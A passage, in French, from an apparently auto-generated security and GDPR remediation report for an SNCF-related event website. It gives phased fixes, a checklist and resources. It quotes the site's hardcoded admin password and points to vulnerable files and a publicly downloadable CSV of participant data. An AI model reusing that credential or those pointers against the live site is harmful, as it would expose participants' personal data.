Option A (minimale, GitHub Pages) : HTTP Basic Auth via un fichier `.htaccess` sur un serveur dédié, ou redirection vers une page d'accès protégée par token.

Option B (recommandée) : Migrer vers un backend minimal (Vercel/Netlify Functions) avec authentification OAuth2 SNCF.

```javascript
// SUPPRIMER IMMÉDIATEMENT :
const MDP = 'cc2026admin';

// REMPLACER PAR (Option A — solution intermédiaire) :
// Mettre admin.html derrière un proxy avec authentification serveur
// OU utiliser un token aléatoire généré côté serveur
```

#### 1.2 Sécuriser l'accès au CSV

**Effort :** 2-4 heures  
**Impact :** Empêche l'exfiltration massive des données

```
Options :
A. Déplacer le CSV derrière une API sécurisée (Netlify/Vercel Functions)
B. Exiger un token d'accès dans la requête de téléchargement
C. Hacher les données avec un salt connu seulement du serveur
```

#### 1.3 Ajouter une politique de confidentialité

**Effort :** 4-8 heures  
**Impact :** Conformité RGPD minimale

La politique doit inclure :
- Finalité du traitement
- Base légale (consentement lors de l'inscription)
- Données collectées (liste exhaustive)
- Destinataires (Microsoft, Tally, équipe organisatrice)
- Durée de conservation (proposée : 30 jours après l'événement)
- Droits des personnes (accès, rectification, suppression, portabilité)
- Contact DPO ou référent RGPD SNCF
- Droit de saisir la CNIL

---

### Phase 2 — Court terme (1 mois)

#### 2.1 Ajouter SRI sur toutes les ressources externes

**Effort :** 2 heures

```bash
# Générer les hashes SRI
curl -s https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js | openssl dgst -sha384 -binary | openssl base64 -A
```

```html
<!-- admin.html -->
<script 
  src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"
  integrity="sha384-HASH_ICI"
  crossorigin="anonymous">
</script>
```

#### 2.2 Ajouter une bannière de consentement aux cookies

**Effort :** 4-8 heures

```html
<!-- Bannière RGPD minimale conforme CNIL -->
<div id="cookie-banner" style="position:fixed;bottom:0;width:100%;background:#1a1a2e;color:#fff;padding:1rem;z-index:9999">
  <p>Ce site utilise des cookies fonctionnels. Des services tiers (Microsoft Forms, Tally.so) peuvent également en déposer.
  <a href="/cgu.html#cookies">En savoir plus</a></p>
  <button onclick="acceptCookies()">Accepter</button>
  <button onclick="refuseCookies()">Refuser</button>
</div>
```

#### 2.3 Renforcer la validation des données Excel

**Effort :** 8-16 heures

```javascript
// Schéma de validation à implémenter dans script.js
const SCHEMA = {
  required: ['ID', 'NOM', 'PRÉNOM', 'EMAIL'],
  maxRows: 2000,
  maxFileSizeMB: 10,
  fields: {
    'ID': { type: 'number', min: 1, max: 9999 },
    'EMAIL': { pattern: /^[^@]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/ },
    'SEXE': { enum: ['M', 'F', ''] },
    'AGE': { type: 'number', min: 16, max: 99 }
  }
};

function validateData(data) {
  if (data.length > SCHEMA.maxRows) throw new Error(`Fichier trop volumineux (max ${SCHEMA.maxRows} lignes)`);
  // ... validation par champ
}
```

#### 2.4 Remplacer innerHTML par textContent

**Effort :** 4 heures

```javascript
// Mauvais
element.innerHTML = `<strong>${escapeHtml(name)}</strong>`;

// Bon
const el = document.createElement('strong');
el.textContent = name;  // Pas de risque XSS, même sans escapeHtml
element.appendChild(el);
```

#### 2.5 Ajouter des en-têtes de sécurité via Cloudflare

**Effort :** 2 heures (configuration Cloudflare)

Mettre en place Cloudflare (plan gratuit) et configurer les règles de transformation :

```
Content-Security-Policy: default-src 'self'; script-src 'self' cdnjs.cloudflare.com tally.so 'nonce-RANDOM'; frame-src forms.office.com tally.so; style-src 'self' fonts.googleapis.com 'unsafe-inline'; font-src fonts.gstatic.com
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
```

---

### Phase 3 — Moyen terme (3 mois)

#### 3.1 Migration vers un backend sécurisé

**Effort :** 100-200 heures  
**Technologie recommandée :** Node.js + Express (ou Bun + Hono) sur Fly.io ou Railway (EU)

Architecture cible :
```
Participants → Frontend (GitHub Pages)
                    │
                    ▼
             API Backend (Node.js)
                    │
             ┌──────┴──────┐
             │             │
        PostgreSQL      Redis
        (données)    (sessions/rate limiting)
             │
        Chiffrement AES-256
```

Fonctionnalités à implémenter :
- [ ] Authentification OAuth2 via SNCF Entra ID
- [ ] Sessions serveur avec expiration
- [ ] Rate limiting (ex: 10 requêtes/minute par IP)
- [ ] Chiffrement des données au repos
- [ ] Journalisation d'audit (qui, quand, quelle action)
- [ ] API RGPD : endpoint de suppression de compte
- [ ] Purge automatique 30 jours après l'événement

#### 3.2 Réaliser une AIPD (Analyse d'Impact sur la Protection des Données)

**Effort :** 20-40 heures (avec le DPO SNCF)

Obligatoire car le traitement présente des risques élevés (Article 35 RGPD) :
- Large volume de personnes (800+)
- Données sensibles (santé inférée, photos)
- Employeur impliqué (relation de pouvoir)

#### 3.3 Établir des DPA avec Microsoft et Tally

- Vérifier l'Addendum de Protection des Données Microsoft (déjà en place pour SNCF ?)
- Obtenir un DPA Tally.so conforme RGPD (résidence des données en UE)
- Documenter ces accords dans le registre des traitements

#### 3.4 Mettre en place un plan de réponse aux incidents

Procédure à documenter :
```
1. Détection : Qui surveille ? (alerte SIEM, signalement utilisateur)
2. Qualification : Gravité, périmètre, données concernées
3. Containment : Actions immédiates (bloquer accès, couper endpoint)
4. Notification CNIL : Sous 72h si violation (Article 33 RGPD)
5. Notification personnes : Si risque élevé (Article 34 RGPD)
6. Remédiation : Correction des causes racines
7. Post-mortem : Rapport et mise à jour des procédures
```

---

## Annexe A — Checklist de remédiation

### Sécurité

- [ ] Supprimer les mots de passe hardcodés (`admin.html:54`, `resultats.html:291`)
- [ ] Implémenter une authentification côté serveur
- [ ] Ajouter le MFA pour l'accès admin
- [ ] Sécuriser l'accès au CSV (authentification obligatoire)
- [ ] Ajouter SRI sur toutes les ressources externes
- [ ] Configurer les en-têtes HTTP de sécurité
- [ ] Ajouter un rate limiting sur la vérification par ID
- [ ] Remplacer `innerHTML` par `textContent` dans verify.js et script.js
- [ ] Chiffrer les données sensibles en localStorage
- [ ] Ajouter une validation de schéma sur l'upload Excel
- [ ] Implémenter des journaux d'audit

### RGPD

- [ ] Créer une politique de confidentialité dédiée
- [ ] Mettre à jour les CGU avec la liste complète des données collectées
- [ ] Spécifier les durées de rétention
- [ ] Ajouter une bannière de consentement aux cookies
- [ ] Implémenter un mécanisme de suppression des données (Article 17)
- [ ] Établir un DPA avec Microsoft Forms
- [ ] Établir un DPA avec Tally.so
- [ ] Constituer le registre des traitements (Article 30)
- [ ] Réaliser une AIPD (Article 35)
- [ ] Identifier et documenter le contact DPO
- [ ] Supprimer l'historique Git du CSV (`git filter-repo`)
- [ ] Définir et appliquer une politique de purge automatique

---

## Annexe B — Ressources

- [CNIL — Guides pratiques RGPD](https://www.cnil.fr/fr/rgpd-par-ou-commencer)
- [CNIL — Modèle de politique de confidentialité](https://www.cnil.fr/fr/modeles/outil/generateur-de-mentions-dinformation)
- [OWASP — Top 10](https://owasp.org/www-project-top-ten/)
- [SRI Hash Generator](https://www.srihash.org/)
- [CNIL — Référentiel de sécurité](https://www.cnil.fr/fr/la-securite-des-donnees)
- [Guide Microsoft DPA](https://www.microsoft.com/fr-fr/trust-center/privacy/gdpr-data-subject-requests)

---

*Rapport généré le 2026-04-11 — Analyse statique automatisée du code source (23 fichiers, 7 113 lignes)*  
*Ce rapport ne se substitue pas à un audit de sécurité professionnel ni à un conseil juridique. Il est recommandé de le faire valider par le DPO et l'équipe cybersécurité SNCF.*
